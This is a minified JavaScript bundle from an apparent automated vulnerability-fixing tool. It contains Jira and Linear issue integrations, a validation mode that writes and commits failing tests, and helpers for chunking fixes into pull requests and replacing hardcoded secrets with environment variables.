J=this.extractIssueId(X),Y=await(await this.makeRequest(`${this.baseUrl}/issue/${J}`)).json();return this.convertToUnifiedIssue(Y)}catch(J){if(J.message?.includes("404"))return null;throw new Error(this.formatError("Get Jira issue",J))}}async createComment(X,J){try{let Q=this.extractIssueId(X),W=await(await this.makeRequest(`${this.baseUrl}/issue/${Q}/comment`,{method:"POST",body:JSON.stringify({body:{type:"doc",version:1,content:[{type:"paragraph",content:[{type:"text",text:J}]}]}})})).json();return{id:W.id,body:J,author:W.author?.displayName||"Unknown",createdAt:new Date(W.created)}}catch(Q){return q.error("Failed to create Jira comment",Q),null}}async updateIssueStatus(X,J){try{let Q=this.extractIssueId(X),Y=await this.makeRequest(`${this.baseUrl}/issue/${Q}/transitions`),{transitions:W}=await Y.json(),z=W.find((G)=>G.name===J);if(!z)return q.warn(`Status '${J}' not available for issue ${X}`),!1;return await this.makeRequest(`${this.baseUrl}/issue/${Q}/transitions`,{method:"POST",body:JSON.stringify({transition:{id:z.id}})}),!0}catch(Q){return q.error("Failed to update Jira issue status",Q),!1}}async addLink(X,J,Q){try{let Y=this.extractIssueId(X),W=Q||J;return{id:(await(await this.makeRequest(`${this.baseUrl}/issue/${Y}/remotelink`,{method:"POST",body:JSON.stringify({object:{url:J,title:W,icon:{url16x16:J.includes("github.com")?"https://github.com/favicon.ico":void 0,title:J.includes("github.com")?"GitHub Pull Request":"External Link"}}})})).json()).id,url:J,title:W,type:"external"}}catch(Y){return q.error("Failed to add link to Jira issue",Y),null}}async addLabel(X,J){try{let Q=this.extractIssueId(X),z=(await(await this.makeRequest(`${this.baseUrl}/issue/${Q}?fields=labels`)).json()).fields.labels||[];if(!z.includes(J))await this.makeRequest(`${this.baseUrl}/issue/${Q}`,{method:"PUT",body:JSON.stringify({fields:{labels:[...z,J]}})});return!0}catch(Q){return q.error("Failed to add label to Jira issue",Q),!1}}convertToUnifiedIssue(X){return{id:X.id,platform:"jira",key:X.key,title:X.fields.summary,description:X.fields.description||"",labels:X.fields.labels||[],status:X.fields.status.name,url:`https://${this.config.host}/browse/${X.key}`,createdAt:new Date(X.fields.created),updatedAt:new Date(X.fields.updated),assignee:X.fields.assignee?{id:X.fields.assignee.accountId,name:X.fields.assignee.displayName,email:X.fields.assignee.emailAddress}:void 0,reporter:X.fields.reporter?{id:X.fields.reporter.accountId,name:X.fields.reporter.displayName,email:X.fields.reporter.emailAddress}:void 0}}async searchAutofixIssues(){return this.searchIssues(`labels = "${this.autofixLabel}"`)}async searchRsolvIssues(){let X=`labels in ("${this.autofixLabel}", "${this.rsolvLabel}")`;return this.searchIssues(X)}}});var G3;var bD=j1(()=>{Y3();t1();G3=class G3 extends $Q{apiKey;baseUrl="https://api.linear.app/graphql";teamId;constructor(X){super(X);this.validateConfig(X,["apiKey"]),this.apiKey=X.apiKey,this.teamId=X.teamId}getAuthHeaders(){return{Authorization:this.apiKey,"Content-Type":"application/json"}}async graphqlRequest(X,J){try{let Y=await(await this.makeRequest(this.baseUrl,{method:"POST",body:JSON.stringify({query:X,variables:J})})).json();if(Y.errors)throw new Error(`Linear GraphQL error: ${JSON.stringify(Y.errors)}`);return Y.data}catch(Q){throw new Error(this.formatError("Linear GraphQL request",Q))}}async searchRsolvIssues(){let J={labels:{or:[{name:{eq:this.autofixLabel}},{name:{eq:this.rsolvLabel}}]}};if(this.teamId)J.team={id:{eq:this.teamId}};try{return(await this.graphqlRequest(`
      query SearchIssues($filter: IssueFilter) {
        issues(filter: $filter) {
          nodes {
            id
            identifier
            title
            description
            state {
              name
              type
            }
            labels {
              nodes {
                name
              }
            }
            assignee {
              name
              email
            }
            createdAt
            updatedAt
            url
          }
        }
      }
    `,{filter:J})).issues.nodes.map((Y)=>this.convertToUnifiedIssue(Y))}catch(Q){throw q.error("Failed to search Linear issues:",Q),Q}}async getIssue(X){try{let Q=await this.graphqlRequest(`
      query GetIssue($id: String!) {
        issue(id: $id) {
          id
          identifier
          title
          description
          state {
            name
            type
          }
          labels {
            nodes {
              name
            }
          }
          assignee {
            name
            email
          }
          createdAt
          updatedAt
          url
        }
      }
    `,{id:X});return Q.issue?this.convertToUnifiedIssue(Q.issue):null}catch(Q){return q.error(`Failed to get Linear issue ${X}:`,Q),null}}async createComment(X,J){try{let Y=await this.graphqlRequest(`
      mutation CreateComment($issueId: String!, $body: String!) {
        commentCreate(
          input: {
            issueId: $issueId
            body: $body
          }
        ) {
          success
          comment {
            id
            body
            user {
              name
              email
            }
            createdAt
          }
        }
      }
    `,{issueId:X,body:J});if(!Y.commentCreate.success)throw new Error("Failed to create comment");let W=Y.commentCreate.comment;return{id:W.id,body:W.body,author:W.user.name,createdAt:new Date(W.createdAt)}}catch(Y){return q.error(`Failed to create comment on Linear issue ${X}:`,Y),null}}async addLink(X,J,Q){let W=`\uD83D\uDD17 Related: ${Q?`[${Q}](${J})`:J}`,z=await this.createComment(X,W);if(!z)return null;return{id:z.id,url:J,title:Q||J,type:"external"}}async updateIssueStatus(X,J){try{let Y=await this.graphqlRequest(`
      query GetStates($name: String!) {
        workflowStates(filter: { name: { eq: $name } }) {
          nodes {
            id
            name
            type
          }
        }
      }
    `,{name:J});if(Y.workflowStates.nodes.length===0)return q.error(`No Linear state found with name: ${J}`),!1;let W=Y.workflowStates.nodes[0].id,z=`
        mutation UpdateIssue($issueId: String!, $stateId: String!) {
          issueUpdate(
            id: $issueId
            input: { stateId: $stateId }
          ) {
            success
          }
        }
      `;return(await this.graphqlRequest(z,{issueId:X,stateId:W})).issueUpdate.success}catch(Y){return q.error(`Failed to update Linear issue ${X} status:`,Y),!1}}async addLabel(X,J){try{let Y=await this.graphqlRequest(`
      query GetLabel($name: String!) {
        issueLabels(filter: { name: { eq: $name } }) {
          nodes {
            id
            name
          }
        }
      }
    `,{name:J}),W;if(Y.issueLabels.nodes.length===0){let U=await this.graphqlRequest(`
          mutation CreateLabel($name: String!) {
            issueLabelCreate(
              input: { name: $name }
            ) {
              success
              issueLabel {
                id
              }
            }
          }
        `,{name:J});if(!U.issueLabelCreate.success)return!1;W=U.issueLabelCreate.issueLabel.id}else W=Y.issueLabels.nodes[0].id;let z=`
        mutation AddLabel($issueId: String!, $labelId: String!) {
          issueAddLabel(
            id: $issueId
            labelId: $labelId
          ) {
            success
          }
        }
      `;return(await this.graphqlRequest(z,{issueId:X,labelId:W})).issueAddLabel.success}catch(Y){return q.error(`Failed to add label to Linear issue ${X}:`,Y),!1}}convertToUnifiedIssue(X){return{id:X.id,platform:"linear",key:X.identifier,title:X.title,description:X.description||"",labels:X.labels.nodes.map((J)=>J.name),status:X.state.name,statusCategory:this.mapLinearStateType(X.state.type),assignee:X.assignee?.name,createdAt:new Date(X.createdAt),updatedAt:new Date(X.updatedAt),url:X.url}}mapLinearStateType(X){switch(X.toLowerCase()){case"backlog":case"unstarted":return"todo";case"started":case"in_progress":return"in_progress";case"completed":case"done":case"canceled":return"done";default:return"todo"}}}});class i2{static create(X,J){switch(X){case"jira":if(!J.jira)throw new Error("Jira configuration is required");return new W3(J.jira);case"linear":if(!J.linear)throw new Error("Linear configuration is required");return new G3(J.linear);case"gitlab":throw new Error("GitLab integration not yet implemented");default:throw new Error(`Unsupported platform: ${X}`)}}}var vD=j1(()=>{kD();bD()});var fD={};Y9(fD,{detectIssuesFromAllPlatforms:()=>wu1});async function wu1(X){let J=[],Q=X.maxIssues;try{let Y=await ED(X);if(J.push(...Y),q.info(`Found ${Y.length} GitHub issues`),Q&&J.length>=Q)return q.info(`Limiting to first ${Q} issues (max_issues: ${Q})`),J.slice(0,Q)}catch(Y){q.error("Error detecting GitHub issues",Y)}if(process.env.JIRA_HOST&&process.env.JIRA_EMAIL&&process.env.JIRA_API_TOKEN){if(!Q||J.length<Q)try{let Y=await Iu1(X);if(J.push(...Y),q.info(`Found ${Y.length} Jira issues`),Q&&J.length>=Q)return q.info(`Limiting to first ${Q} issues (max_issues: ${Q})`),J.slice(0,Q)}catch(Y){q.error("Error detecting Jira issues",Y)}}if(process.env.LINEAR_API_KEY){if(!Q||J.length<Q)try{let Y=await Cu1(X);if(J.push(...Y),q.info(`Found ${Y.length} Linear issues`),Q&&J.length>=Q)return q.info(`Limiting to first ${Q} issues (max_issues: ${Q})`),J.slice(0,Q)}catch(Y){q.error("Error detecting Linear issues",Y)}}if(process.env.GITLAB_TOKEN)q.info("GitLab integration not yet implemented");if(q.info(`Total issues found across all platforms: ${J.length}`),Q&&J.length>Q)return q.info(`Limiting to first ${Q} issues (max_issues: ${Q})`),J.slice(0,Q);return J}async function Iu1(X){let J={jira:{host:process.env.JIRA_HOST,email:process.env.JIRA_EMAIL,apiToken:process.env.JIRA_API_TOKEN,autofixLabel:process.env.JIRA_AUTOFIX_LABEL||"autofix",rsolvLabel:process.env.JIRA_RSOLV_LABEL||"rsolv"}},Q=i2.create("jira",J),Y;if(process.env.JIRA_JQL)Y=await Q.searchIssues(process.env.JIRA_JQL);else Y=await Q.searchRsolvIssues();return q.info(`Found ${Y.length} Jira issues with rsolv/autofix labels`),Y.map((W)=>xD(W))}async function Cu1(X){let J={linear:{apiKey:process.env.LINEAR_API_KEY,teamId:process.env.LINEAR_TEAM_ID,autofixLabel:process.env.LINEAR_AUTOFIX_LABEL||"autofix",rsolvLabel:process.env.LINEAR_RSOLV_LABEL||"rsolv"}},Y=await i2.create("linear",J).searchRsolvIssues();return q.info(`Found ${Y.length} Linear issues with rsolv/autofix labels`),Y.map((W)=>xD(W))}function xD(X){let J=Pu1(X);return{id:X.id,number:parseInt(X.key?.split("-")[1]||"0"),title:X.title,body:X.description,labels:X.labels,assignees:X.assignee?[typeof X.assignee==="string"?X.assignee:X.assignee.name]:[],repository:J||{owner:"unknown",name:"unknown",fullName:"unknown/unknown",defaultBranch:"main",language:"unknown"},source:X.platform,createdAt:X.createdAt.toISOString(),updatedAt:X.updatedAt.toISOString(),metadata:{htmlUrl:X.url,state:X.status,locked:!1,draft:!1,platformKey:X.key}}}function Pu1(X){let Q=/https?:\/\/github\.com\/([^/]+)\/([^/\s]+)/g.exec(X.description);if(Q){let[,Y,W]=Q;return{owner:Y,name:W,fullName:`${Y}/${W}`,defaultBranch:"main",language:"unknown"}}if(X.customFields?.githubRepository){let[Y,W]=X.customFields.githubRepository.split("/");return{owner:Y,name:W,fullName:X.customFields.githubRepository,defaultBranch:X.customFields.githubDefaultBranch||"main",language:X.customFields.githubLanguage||"unknown"}}return null}var gD=j1(()=>{t1();$D();vD()});var z3={};Y9(z3,{ValidationMode:()=>hD});import{execSync as BX}from"child_process";import*as L9 from"fs";import*as t9 from"path";class hD{config;falsePositiveCache;repoPath;constructor(X,J){this.config=X,this.repoPath=J||process.cwd(),this.falsePositiveCache=new Set,this.loadFalsePositiveCache()}async validateVulnerability(X){q.info(`[VALIDATION MODE] Starting validation for issue #${X.number}`);try{this.ensureCleanGitState();let J=this.getCacheKey(X);if(this.falsePositiveCache.has(J)&&!process.env.RSOLV_SKIP_CACHE)return q.info(`Issue #${X.number} is in false positive cache, skipping`),{issueId:X.number,validated:!1,falsePositiveReason:"Previously identified as false positive",timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};q.info(`Analyzing issue #${X.number} for validation`);let Q=await X6(X,this.config);if(!Q.canBeFixed)return q.warn(`Issue #${X.number} cannot be validated: ${Q.cannotFixReason}`),{issueId:X.number,validated:!1,falsePositiveReason:Q.cannotFixReason||"Analysis determined issue cannot be fixed",timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};q.info(`Generating RED tests for issue #${X.number}`);let Y=await this.generateRedTests(X,Q);if(!Y||!Y.generatedTests)return q.warn(`Failed to generate tests for issue #${X.number}`),{issueId:X.number,validated:!1,falsePositiveReason:"Unable to generate validation tests",timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};q.info("Creating validation branch for test persistence");let W=null;try{W=await this.createValidationBranch(X),await this.commitTestsToBranch(Y.generatedTests.testSuite,W),q.info(` Tests committed to validation branch: ${W}`)}catch(H){q.warn(`Could not create validation branch: ${H}`)}q.info("Running RED tests to prove vulnerability exists");let G=await new iX().validateFixWithTests("HEAD","HEAD",Y.generatedTests.testSuite);if(G.success)return q.info("Tests passed on vulnerable code - marking as false positive"),this.addToFalsePositiveCache(X),{issueId:X.number,validated:!1,falsePositiveReason:"Tests passed on allegedly vulnerable code",testResults:G,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};else{if(q.info(" Vulnerability validated! RED tests failed as expected"),W)await this.storeValidationResultWithBranch(X,Y,G,W),q.info(`Validation result stored with branch reference: ${W}`);else await this.storeValidationResult(X,Y,G);return{issueId:X.number,validated:!0,branchName:W||void 0,redTests:Y.generatedTests.testSuite,testResults:G,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()}}}catch(J){return q.error(`Validation failed for issue #${X.number}:`,J),{issueId:X.number,validated:!1,falsePositiveReason:`Validation error: ${J}`,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()}}}async validateBatch(X){q.info(`[VALIDATION MODE] Validating batch of ${X.length} issues`);let J=[];for(let W of X){let z=await this.validateVulnerability(W);if(J.push(z),X.indexOf(W)<X.length-1)await new Promise((G)=>setTimeout(G,2000))}let Q=J.filter((W)=>W.validated).length,Y=J.filter((W)=>!W.validated).length;return q.info("[VALIDATION MODE] Batch complete:"),q.info(`  - Validated: ${Q}`),q.info(`  - False positives: ${Y}`),J}async generateRedTests(X,J){let Q={provider:"anthropic",apiKey:this.config.aiProvider.apiKey,model:this.config.aiProvider.model,temperature:0.2,maxTokens:this.config.aiProvider.maxTokens,useVendedCredentials:this.config.aiProvider.useVendedCredentials},Y=new YX(Q),W=new Map;if(J.filesToModify&&J.filesToModify.length>0)for(let z of J.filesToModify)try{let G=t9.resolve(this.repoPath,z);if(L9.existsSync(G)){let H=L9.readFileSync(G,"utf8");W.set(z,H),q.debug(`Added file for test generation: ${z}`)}}catch(G){q.warn(`Could not read file ${z}:`,G)}return await Y.analyzeWithTestGeneration(X,this.config,W)}async createValidationBranch(X){let J=`rsolv/validate/issue-${X.number}`;try{return BX(`git checkout -b ${J}`,{cwd:this.repoPath}),q.info(`Created validation branch: ${J}`),J}catch(Q){throw q.error(`Failed to create validation branch ${J}:`,Q),Q}}async commitTestsToBranch(X,J){try{let Q=t9.join(this.repoPath,".rsolv","tests");L9.mkdirSync(Q,{recursive:!0});let Y;if(typeof X==="string")Y=X;else if(X&&typeof X==="object")Y=JSON.stringify(X,null,2);else Y=`// Validation test placeholder
describe('Vulnerability Test', () => {
  it('should validate vulnerability exists', () => {
    // Red test generated by ValidationMode
    console.log('Test content:', ${JSON.stringify(X)});
  });
});`;let W=t9.join(Q,"validation.test.js");L9.writeFileSync(W,Y,"utf8"),BX('git config user.email "rsolv-validation@rsolv.dev"',{cwd:this.repoPath}),BX('git config user.name "RSOLV Validation Bot"',{cwd:this.repoPath}),BX("git add .rsolv/tests/",{cwd:this.repoPath}),BX('git commit -m "Add validation tests for issue"',{cwd:this.repoPath}),q.info(`Committed tests to branch ${J}`);try{BX(`git push origin ${J}`,{cwd:this.repoPath}),q.info(`Pushed validation branch ${J} to remote`)}catch(z){q.warn(`Could not push validation branch to remote: ${z}`)}}catch(Q){throw q.error(`Failed to commit tests to branch ${J}:`,Q),Q}}async storeValidationResultWithBranch(X,J,Q,Y){let W=t9.join(this.repoPath,".rsolv","validation");L9.mkdirSync(W,{recursive:!0});let z=t9.join(W,`issue-${X.number}.json`),G={issueId:X.number,issueTitle:X.title,branchName:Y,validated:!0,testResults:J,validationResult:Q,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};L9.writeFileSync(z,JSON.stringify(G,null,2)),q.info(`Validation result with branch stored at ${z}`)}async storeValidationResult(X,J,Q){let Y=t9.join(this.repoPath,".rsolv","validation");L9.mkdirSync(Y,{recursive:!0});let W=t9.join(Y,`issue-${X.number}.json`),z={issueId:X.number,issueTitle:X.title,validated:!0,testResults:J,validationResult:Q,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};L9.writeFileSync(W,JSON.stringify(z,null,2)),q.info(`Validation result stored at ${W}`)}loadFalsePositiveCache(){try{let X=t9.join(this.repoPath,".rsolv","false-positives.json");if(L9.existsSync(X))JSON.parse(L9.readFileSync(X,"utf8")).entries?.forEach((Q)=>{if(Q.expiresAt&&new Date(Q.expiresAt)<new Date)return;this.falsePositiveCache.add(Q.pattern)}),q.info(`Loaded ${this.falsePositiveCache.size} false positive patterns`)}catch(X){q.warn("Could not load false positive cache:",X)}}addToFalsePositiveCache(X){let J=this.getCacheKey(X);this.falsePositiveCache.add(J);let Q=t9.join(this.repoPath,".rsolv","false-positives.json"),Y=t9.dirname(Q);L9.mkdirSync(Y,{recursive:!0});let W=Array.from(this.falsePositiveCache).map((z)=>({pattern:z,timestamp:new Date().toISOString(),expiresAt:new Date(Date.now()+2592000000).toISOString()}));L9.writeFileSync(Q,JSON.stringify({entries:W,version:"1.0"},null,2)),q.info(`Added issue #${X.number} to false positive cache`)}getCacheKey(X){return`${X.repository}#${X.number}#${X.title}`}ensureCleanGitState(){try{if(BX("git status --porcelain",{encoding:"utf8"}).trim())throw new Error("Repository has uncommitted changes")}catch(X){q.warn("Git state check failed:",X)}}getCurrentCommitHash(){try{return BX("git rev-parse HEAD",{encoding:"utf8"}).trim()}catch{return"unknown"}}}var H3=j1(()=>{t1();U2();V2();G7()});var yD={};Y9(yD,{parseIssueBody:()=>Su1,enhanceValidationData:()=>Tu1});function Su1(X){let J={files:[]};if(!X||typeof X!=="string")return q.warn("[IssueBodyParser] Invalid issue body provided"),J;let Q=X.match(/\*\*Type\*\*:\s*(\S+)/);if(Q)J.type=Q[1];let Y=X.match(/\*\*Severity\*\*:\s*(\S+)/);if(Y)J.severity=Y[1];let W=/####\s*`([^`]+)`/g,z=X.split(`
`),G=null,H=!1;for(let U=0;U<z.length;U++){let K=z[U],V=K.match(/####\s*`([^`]+)`/);if(V){if(G)J.files.push(G);G={path:V[1],vulnerabilities:[]},H=!0;continue}if(H&&G&&K.trim().startsWith("-")){let B=K.match(/-\s*\*\*Line\s+(\d+)\*\*:\s*(.+)/);if(B)G.vulnerabilities.push({line:parseInt(B[1],10),message:B[2].trim()})}if(K.startsWith("###")&&!K.includes("Affected Files")){if(H=!1,G)J.files.push(G),G=null}}if(G)J.files.push(G);return q.debug("[IssueBodyParser] Parsed issue body:",{type:J.type,severity:J.severity,filesCount:J.files.length,files:J.files.map((U)=>({path:U.path,vulnerabilitiesCount:U.vulnerabilities.length}))}),J}function Tu1(X,J){let Q={...X,vulnerabilities:[...X.vulnerabilities||[]]},Y=new Map;return J.files.forEach((W)=>{W.vulnerabilities.forEach((z)=>{if(!Y.has(z.line))Y.set(z.line,W.path);else q.debug("[IssueBodyParser] Line number collision detected:",{line:z.line,existingFile:Y.get(z.line),newFile:W.path})})}),Q.vulnerabilities=Q.vulnerabilities.map((W)=>{if(W.file==="unknown.js"&&W.line&&Y.has(W.line)){let z=Y.get(W.line);return q.debug(`[IssueBodyParser] Replacing unknown.js with ${z} for line ${W.line}`),{...W,file:z,type:W.type==="UNKNOWN"&&J.type?J.type:W.type}}return W}),q.info("[IssueBodyParser] Enhanced validation data:",{originalCount:X.vulnerabilities?.length||0,enhancedCount:Q.vulnerabilities.length,filesFixed:Q.vulnerabilities.filter((W)=>W.file!=="unknown.js"&&X.vulnerabilities?.some((z)=>z.file==="unknown.js"&&z.line===W.line)).length}),Q}var mD=j1(()=>{t1()});var $7,U3=10,K3=100,_u1=7500;var kQ=j1(()=>{V3();((W)=>{W.SIMPLE="simple";W.MODERATE="moderate";W.COMPLEX="complex";W.MANUAL="manual"})($7||={})});class uD{name="module_grouping";async group(X){let J=new Map;for(let Q of X){let Y=Q.path.split("/"),W=Y.length>1?Y[0]:"root";if(!J.has(W))J.set(W,[]);J.get(W).push(Q)}return Array.from(J.values())}}class cD{name="severity_based";async group(X){let J=["CRITICAL","HIGH","MEDIUM","LOW"],Q=new Map;J.forEach((Y)=>Q.set(Y,[]));for(let Y of X)Q.get(Y.severity).push(Y);return J.map((Y)=>Q.get(Y)).filter((Y)=>Y.length>0)}}class lD{name="dependency_analysis";async group(X){let J=[],Q=new Set;for(let W of X){if(Q.has(W.path))continue;let z=[W];if(Q.add(W.path),W.imports)for(let G of W.imports){let H=X.find((U)=>U.path===G||U.path===G+".js"||U.path===G.replace("./","")+".js"||U.path===G.replace("./",""));if(H&&!Q.has(H.path))z.push(H),Q.add(H.path)}for(let G of X){if(Q.has(G.path))continue;if(G.imports?.some((H)=>W.path.includes(H.replace("./",""))||W.path===H+".js"))z.push(G),Q.add(G.path)}J.push(z)}let Y=X.filter((W)=>!Q.has(W.path));if(Y.length>0)J.push(Y);return J}}class k7{config;strategies;constructor(X){this.config=X;this.strategies=new Map,this.strategies.set("module_grouping",new uD),this.strategies.set("severity_based",new cD),this.strategies.set("dependency_analysis",new lD)}async chunkVulnerability(X){let{files:J}=X,Q=[],Y=await this.groupFilesByStrategy(J),W=0;for(let z of Y){let G=[],H=0;for(let U of z){let K=this.estimateTokens([U]),V=G.length>=this.config.maxFilesPerChunk,B=H+K>this.config.maxContextTokens;if(G.length>0&&(V||B))Q.push({index:W++,files:G,estimatedTokens:H,vulnerabilityType:X.type}),G=[],H=0;G.push(U),H+=K}if(G.length>0)Q.push({index:W++,files:G,estimatedTokens:H,vulnerabilityType:X.type})}return Q}getStrategy(X){let J=this.strategies.get(X);if(!J)throw new Error(`Strategy ${X} not found`);return J}async groupFilesByStrategy(X){if(!this.config.strategies||this.config.strategies.length===0)return[X];let J=this.config.strategies;for(let Q of J){let Y=this.strategies.get(Q);if(Y){let W=await Y.group(X);if(W.length>0)return W}}return[X]}estimateTokens(X){return X.reduce((J,Q)=>{let Y=Q.lines.length*U3;return J+Y+K3},0)}}var V3=j1(()=>{kQ()});class bQ{prNumbers=new Map;nextPrNumber=1000;async generatePRSeries(X,J){let Q=[],Y=X.length;for(let W=0;W<X.length;W++){let z=X[W],G=W+1,H={number:this.nextPrNumber++,title:`[RSOLV] Fix ${z.vulnerabilityType} (${G}/${Y})`,branch:`rsolv/fix-${J}-chunk-${G}`,files:z.files,body:this.generatePRBody(z,G,Y,J,Q),dependencies:W>0?[Q[W-1].number]:void 0};Q.push(H),this.prNumbers.set(`${J}-${G}`,H.number)}return Q}generatePRBody(X,J,Q,Y,W){let z=[];if(z.push(`## \uD83D\uDD27 Automated Fix - Part ${J} of ${Q}`),z.push(""),z.push(`Fixes part of #${Y}`),z.push(""),W.length>0){z.push("### Dependencies");let G=W[W.length-1];z.push(`Depends on #${G.number}`),z.push("")}z.push("### Files Modified");for(let G of X.files)z.push(`- \`${G.path}\` (${G.severity} severity)`);if(z.push(""),z.push("### Vulnerability Type"),z.push(`**${X.vulnerabilityType}**`),z.push(""),X.estimatedTokens)z.push("### Context Size"),z.push(`Estimated tokens: ${X.estimatedTokens}`),z.push("");if(Q>1)z.push("### PR Series"),z.push(`This is part ${J} of a ${Q}-part fix series.`),z.push("Please review and merge PRs in order."),z.push("");return z.push("---"),z.push("*Generated by RSOLV with multi-file chunking strategy*"),z.join(`
`)}async delay(X){return new Promise((J)=>setTimeout(J,X))}}class b7{analyze(X){let J=this.calculateFactors(X);return this.determineComplexity(J)}calculateFactors(X){return{fileCount:X.files?.length||1,requiresConfigChange:X.requiresConfigChange||!1,requiresNewDependencies:X.requiresNewDependencies||!1,crossFileReferences:this.countCrossReferences(X),testImpact:this.assessTestImpact(X)}}determineComplexity(X){if(X.fileCount>=10||X.requiresConfigChange&&X.requiresNewDependencies)return"complex";if(X.requiresConfigChange&&X.crossFileReferences>5)return"manual";if(X.fileCount>=3&&X.fileCount<10)return"moderate";return"simple"}countCrossReferences(X){if(!X.files)return 0;let J=0;for(let Q of X.files)if(Q.imports)J+=Q.imports.length;return J}assessTestImpact(X){if(!X.files)return 0;return X.files.filter((Q)=>Q.path.includes("test")||Q.path.includes("spec")).length}}class B3{analyzer=new b7;async route(X){let J=this.analyzer.analyze(X);if(J==="complex"||J==="manual")return{approach:"manual_guide",guide:await this.generateManualGuide(X,J)};return{approach:"automated",complexity:J}}async generateManualGuide(X,J){let Q=[];if(X.requiresConfigChange)Q.push("1. Update configuration files"),Q.push("2. Set environment variables");if(X.requiresNewDependencies)Q.push("3. Install required dependencies"),Q.push("4. Update package.json");return Q.push("5. Review and test changes"),Q.push("6. Validate security improvements"),{steps:Q.length,content:Q.join(`
`),complexity:J,reason:`This ${X.type} vulnerability requires manual intervention due to its complexity`}}}var pD=j1(()=>{kQ();kQ()});class q3{async handle(X){let J=this.identifySecretType(X),Q=this.determineReplacement(J,X),Y=this.generateCodeFix(X,Q),W=this.generateSetupGuide(X,Q);return{success:!0,codeFix:Y,setupGuide:W,instructions:W,pr:{title:`[RSOLV] Remove hardcoded ${J}`,body:`Replaces hardcoded ${J} with environment variable`,branch:`rsolv/fix-hardcoded-${J}`,files:[{path:X.file,lines:[X.line],severity:"CRITICAL"}]},validationSteps:[`Ensure ${Q.envVar} is set in your environment`,"Test the application with the new configuration","Verify the secret is no longer visible in the code"]}}identifySecretType(X){if(X.secretType)return X.secretType.replace("_"," ");let J=X.secret.toLowerCase();if(J.includes("api")||J.includes("key"))return"api key";if(J.includes("password")||J.includes("pwd"))return"password";if(J.includes("token"))return"token";if(J.includes("cert"))return"certificate";return"secret"}determineReplacement(X,J){let Q=this.generateEnvVarName(X,J);return{envVar:Q,accessor:`process.env.${Q}`,configSection:J.context||"configuration"}}generateEnvVarName(X,J){if(J.context==="database_connection")return"DATABASE_PASSWORD";if(X==="api key")return"API_KEY";return X.toUpperCase().replace(/\s+/g,"_")}generateCodeFix(X,J){let Q=[],Y=X.secret.match(/(\w+)\s*[=:]\s*["']([^"']+)["']/);if(Y){let[,W,z]=Y;if(X.secret.includes("="))Q.push(`${W} = ${J.accessor}`);else if(X.secret.includes(":"))Q.push(`${W}: ${J.accessor}`)}else Q.push(J.accessor);return Q.join(`
`)}generateSetupGuide(X,J){let Q=[];Q.push("## Setup Instructions"),Q.push(""),Q.push("Set the following environment variable:"),Q.push(""),Q.push("```bash");let Y=X.secret.match(/["']([^"']+)["']/),W=Y?Y[1]:"<your-secret-value>";if(Q.push(`export ${J.envVar}="${W}"`),Q.push("```"),Q.push(""),Q.push("Or add to your `.env` file:"),Q.push("```"),Q.push(`${J.envVar}=${W}`),Q.push("```"),Q.push(""),X.context==="database_connection")Q.push("### Database Configuration"),Q.push("Make sure your database connection uses the environment variable."),Q.push("");return Q.push("### Security Note"),Q.push("Never commit secrets to version control. Use environment variables or a secure secret management system."),Q.join(`
`)}}var iD={};Y9(iD,{VulnerabilityChunker:()=>k7,TOKENS_PER_LINE:()=>U3,TOKENS_PER_FILE_OVERHEAD:()=>K3,MultiPRGenerator:()=>bQ,MAX_SAFE_TOKENS:()=>_u1,HardcodedSecretsHandler:()=>q3,FixComplexity:()=>$7,ComplexityRouter:()=>B3,ComplexityAnalyzer:()=>b7,ChunkingIntegration:()=>dD});class dD{chunker;prGenerator;complexityAnalyzer;constructor(X){let J={enabled:!0,maxFilesPerChunk:3,maxLinesPerChunk:500,maxContextTokens:8000,multiPR:{enabled:!0,delayBetweenPRs:2000}};this.chunker=new k7(X||J),this.prGenerator=new bQ,this.complexityAnalyzer=new b7}shouldChunk(X){return(X.files?.length||X.filesToModify?.length||1)>3||X.requiresChunking===!0||this.isComplexVulnerability(X)}isComplexVulnerability(X){let J=this.complexityAnalyzer.analyze(X);return J==="complex"||J==="manual"}async processWithChunking(X,J){console.log(`[ChunkingIntegration] Processing ${X.type} with chunking`);let Q=this.convertToMultiFile(X,J),Y=this.complexityAnalyzer.analyze(Q);if(console.log(`[ChunkingIntegration] Complexity: ${Y}`),Y==="manual")return{success:!1,requiresManual:!0,guide:await this.generateManualGuide(Q),message:"This vulnerability requires manual intervention"};let W=await this.chunker.chunkVulnerability(Q);console.log(`[ChunkingIntegration] Created ${W.length} chunks`);let z=await this.prGenerator.generatePRSeries(W,J);return console.log(`[ChunkingIntegration] Generated ${z.length} PRs`),{success:!0,chunked:!0,chunks:W.length,prs:z,complexity:Y}}convertToMultiFile(X,J){let Q=X.files||X.filesToModify?.map((Y)=>({path:Y,lines:[],severity:X.severity||"MEDIUM"}))||[];return{type:X.type||"UNKNOWN",issueNumber:J,files:Q,requiresConfigChange:X.requiresConfigChange,requiresNewDependencies:X.requiresNewDependencies}}async generateManualGuide(X){let J=[];J.push("## Manual Intervention Required"),J.push(""),J.push(`This ${X.type} vulnerability is too complex for automated fixing.`),J.push(""),J.push("### Affected Files");for(let Q of X.files)J.push(`- ${Q.path}`);return J.push(""),J.push("### Recommended Steps"),J.push("1. Review all affected files for the vulnerability pattern"),J.push("2. Identify the root cause of the vulnerability"),J.push("3. Plan a comprehensive fix that addresses all instances"),J.push("4. Test thoroughly to ensure no functionality is broken"),J.push("5. Verify the vulnerability is fully resolved"),J.join(`
